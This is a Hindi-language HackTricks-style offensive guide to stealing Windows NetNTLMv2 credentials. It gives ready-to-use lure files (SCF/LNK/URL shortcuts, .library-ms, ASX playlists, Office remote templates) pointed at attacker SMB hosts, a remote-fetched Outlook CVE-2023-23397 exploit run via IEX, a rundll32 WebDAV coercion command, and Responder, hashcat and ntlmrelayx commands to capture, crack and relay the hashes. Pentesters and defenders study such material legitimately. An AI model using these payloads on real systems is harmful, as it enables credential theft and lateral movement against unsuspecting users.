# NTLM creds चुराने के स्थान

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) पर दिए गए सभी शानदार विचार देखें—ऑनलाइन Microsoft Word फ़ाइल डाउनलोड करवाने से लेकर NTLM leaks के स्रोत https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) तक।**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

अगर आप **ऐसे share पर लिख सकते हैं जिसे users या scheduled jobs Explorer में browse करते हैं**, तो ऐसी फ़ाइलें डालें जिनका metadata आपके UNC की ओर इंगित करता हो (जैसे, `\\ATTACKER\share`)। फ़ोल्डर को render करने पर **implicit SMB authentication** ट्रिगर होता है और आपके listener को **NetNTLMv2** leak होता है।<sup>[[1]](#references)</sup>

1. **Lures जनरेट करें** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF आदि शामिल हैं)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **उन्हें writable share पर छोड़ दें** (कोई भी फ़ोल्डर जिसे victim खोलता है):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **सुनें और crack करें**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows एक साथ कई फ़ाइलों को hit कर सकता है; Explorer जिस भी चीज़ का preview दिखाता है (`BROWSE TO FOLDER`), उसके लिए किसी click की ज़रूरत नहीं होती।

### Windows Media Player playlists (.ASX/.WAX)

अगर आप किसी target से अपनी नियंत्रित Windows Media Player playlist को open या preview करवा सकें, तो entry को UNC path पर point करके Net‑NTLMv2 leak कर सकते हैं। WMP referenced media को SMB के ज़रिए fetch करने की कोशिश करेगा और implicit रूप से authenticate करेगा।<sup>[[3]](#references)[[4]](#references)</sup>

उदाहरण payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

संग्रह और cracking flow:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP में एम्बेडेड .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, ZIP archive के भीतर से सीधे खोली गई .library-ms files को असुरक्षित तरीके से संभालता है। यदि library definition किसी remote UNC path (जैसे, \\attacker\share) की ओर इंगित करती है, तो ZIP के भीतर मौजूद .library-ms को बस browse/open करने से Explorer उस UNC को enumerate करता है और attacker को NTLM authentication भेजता है। इससे NetNTLMv2 मिलता है, जिसे offline crack किया जा सकता है या संभावित रूप से relay किया जा सकता है।<sup>[[2]](#references)</sup>

Attacker UNC की ओर इंगित करने वाली न्यूनतम .library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

ऑपरेशनल चरण
- ऊपर दिए गए XML के साथ .library-ms फ़ाइल बनाएँ (अपना IP/hostname सेट करें)।
- इसे ZIP करें (Windows पर: Send to → Compressed (zipped) folder) और ZIP target को भेजें।
- NTLM capture listener चलाएँ और victim के ZIP के अंदर से .library-ms खोलने का इंतज़ार करें।


### Outlook कैलेंडर रिमाइंडर साउंड पाथ (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Windows के लिए Microsoft Outlook, कैलेंडर आइटम में extended MAPI property PidLidReminderFileParameter को प्रोसेस करता था। अगर वह property किसी UNC path (जैसे, \\attacker\share\alert.wav) की ओर इंगित करती, तो रिमाइंडर बजने पर Outlook SMB share से संपर्क करता और बिना किसी क्लिक के उपयोगकर्ता का Net-NTLMv2 leak हो जाता। इसे 14 मार्च, 2023 को पैच कर दिया गया था, लेकिन पुराने/बिना अपडेट किए गए सिस्टम के लिए और ऐतिहासिक incident response में यह अब भी अत्यंत प्रासंगिक है।<sup>[[5]](#references)</sup>

PowerShell से तुरंत exploitation (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener पक्ष:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

नोट्स
- Victim को बस reminder trigger होने पर Outlook for Windows चालू रखना होता है।
- इस leak से Net‑NTLMv2 मिलता है, जिसे offline cracking या relay के लिए इस्तेमाल किया जा सकता है (pass-the-hash के लिए नहीं)।

### .LNK/.URL आइकन-आधारित zero-click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 का bypass)

Windows Explorer shortcut icons को अपने-आप render करता है। हालिया research से पता चला कि UNC-icon shortcuts के लिए Microsoft के अप्रैल 2025 patch के बाद भी, shortcut target को UNC path पर host करके और icon को local रखकर बिना किसी click के NTLM authentication trigger करना संभव था (इस patch bypass को CVE‑2025‑50154 सौंपा गया)। केवल folder देखने से Explorer remote target से metadata retrieve करता है और attacker के SMB server को NTLM भेजता है।<sup>[[6]](#references)</sup>

न्यूनतम Internet Shortcut payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShell के जरिए प्रोग्राम शॉर्टकट payload (.lnk):

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

डिलीवरी के विचार
- Shortcut को ZIP में डालें और पीड़ित से उसे ब्राउज़ करवाएँ।
- Shortcut को ऐसी writable share पर रखें जिसे पीड़ित खोलेगा।
- उसी फ़ोल्डर में अन्य lure फ़ाइलें रखें, ताकि Explorer उन आइटम का preview दिखाए।

### ExtraData icon path के ज़रिए बिना क्लिक किए .LNK NTLM leak (CVE‑2026‑25185)

Windows `.lnk` metadata को केवल execution के समय नहीं, बल्कि **view/preview** के दौरान (icon render करते समय) भी लोड करता है। CVE‑2026‑25185 एक ऐसा parsing path दिखाता है, जहाँ **ExtraData** blocks के कारण shell icon path को resolve करके **लोड के दौरान** filesystem को access करता है। अगर path remote हो, तो इससे outbound NTLM authentication होता है।

मुख्य trigger conditions (`CShellLink::_LoadFromStream` में देखी गईं):
- ExtraData में **DARWIN_PROPS** (`0xa0000006`) शामिल करें (यह icon update routine को चलाने की शर्त है)।
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) शामिल करें और **TargetUnicode** को populate करें।
- Loader, `TargetUnicode` में environment variables को expand करता है और परिणामी path पर `PathFileExistsW` call करता है।

अगर `TargetUnicode` किसी UNC path पर resolve होता है (उदाहरण के लिए, `\\attacker\share\icon.ico`), तो केवल उस फ़ोल्डर को देखने से, जिसमें यह shortcut है, outbound authentication हो जाता है। इसी load path को **indexing** और **AV scanning** भी trigger कर सकते हैं, जिससे यह बिना क्लिक वाला एक व्यावहारिक leak surface बन जाता है।<sup>[[7]](#references)</sup>

Windows GUI का इस्तेमाल किए बिना ये structures बनाने और inspect करने के लिए research tooling (parser/generator/UI), **LnkMeMaybe** project में उपलब्ध है।<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie` के ज़रिए WebDAV auth coercion / credential validation

Native **WebDAV client** का दुरुपयोग करके मौजूदा logon session से किसी भी **HTTP/WebDAV** endpoint पर authenticate करवाया जा सकता है:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

यह क्यों उपयोगी है:
- **हमलावर-नियंत्रित WebDAV server** के विरुद्ध, custom client चलाए बिना **NTLM over HTTP** ट्रिगर किया जा सकता है।
- **आंतरिक hosts** के विरुद्ध, lateral movement से पहले यह चुपचाप **जाँचना** संभव बनाता है कि चुराए गए credentials कहाँ स्वीकार किए जाते हैं।<sup>[[9]](#references)</sup>
- यह command तब अच्छा विकल्प है जब **SMB egress फ़िल्टर किया गया हो**, लेकिन **HTTP/WebDAV** अब भी पहुँच योग्य हो।

ऑपरेशनल नोट्स:
- स्रोत host पर **WebClient** service चल रही होनी चाहिए।
- `rundll32.exe`, `davclnt.dll` लोड करता है और Windows से **वर्तमान user के credentials** का उपयोग करके WebDAV authentication करवाता है।<sup>[[10]](#references)</sup>
- यदि आप इसे अपने नियंत्रण वाले infrastructure की ओर इंगित करते हैं, तो NTLM-aware HTTP listener/relay का उपयोग करें, जैसे:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Detection के दृष्टिकोण से, कई internal systems के विरुद्ध बार-बार `rundll32.exe davclnt.dll,DavSetCookie` चलाना, सामान्य user behavior के बजाय **credential validation / spray-जैसी lateral movement की तैयारी** का मज़बूत संकेत है।<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) से NTLM को बाध्य करना

Office documents किसी external template का संदर्भ दे सकते हैं। यदि आप attached template को UNC path पर सेट करते हैं, तो document खोलने पर SMB से authenticate किया जाएगा।

न्यूनतम DOCX relationship बदलाव (word/ के अंदर):

1) word/settings.xml संपादित करें और attached template का संदर्भ जोड़ें:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels को संपादित करें और rId1337 को अपने UNC पर निर्देशित करें:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) फिर से .docx में पैक करके भेजें। अपना SMB capture listener चलाएँ और फ़ाइल खुलने का इंतज़ार करें।

NTLM को relay करने या उसका दुरुपयोग करने के बारे में capture के बाद के विचारों के लिए देखें:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – लिखने योग्य share के ज़रिए फँसाना + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 से DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → webroot RCE के लिए NTFS junction → SYSTEM तक FullPowers + GodPotato](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – NTLM की 5 vulnerabilities: Microsoft में privilege escalation के अनपैच किए गए खतरे](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft ने Outlook EoP (CVE‑2023‑23397) को कम किया और PidLidReminderFileParameter के ज़रिए NTLM leak की व्याख्या की](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, एक NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 की समीक्षा](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – जब IT Support कॉल करता है: Teams से Domain Compromise तक ModeloRAT अभियान का विश्लेषण](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV अनुरोध](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlm Hashes चुराने के लिए रुचि के स्थान](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
